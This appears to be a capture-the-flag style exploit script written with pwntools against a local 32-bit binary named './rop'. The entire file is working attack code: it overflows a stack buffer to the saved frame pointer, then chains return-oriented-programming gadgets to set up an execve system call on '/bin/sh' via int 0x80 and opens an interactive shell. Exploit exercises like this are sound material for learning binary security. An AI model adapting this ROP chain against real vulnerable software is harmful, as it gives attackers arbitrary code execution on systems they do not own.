from pwn import *
from pwnlib.util.packing import p32

sh = process("./rop")

addr_v4 = 0xffffd5cc
addr_ebp = 0xffffd638
len_ebp = addr_ebp - addr_v4

addr_pop_eax = 0x080bb196
addr_pop_edx_ecx_ebx = 0x0806eb90
addr_sh = 0x080be408
addr_int_0x80 = 0x08049421

payload = (b'a'*len_ebp + b'bbbb' \
        + p32(addr_pop_eax) + p32(0x0b) \
        + p32(addr_pop_edx_ecx_ebx) + p32(0x00) + p32(0x00) + p32(addr_sh) \
        + p32(addr_int_0x80))

sh.sendline(payload)
sh.interactive()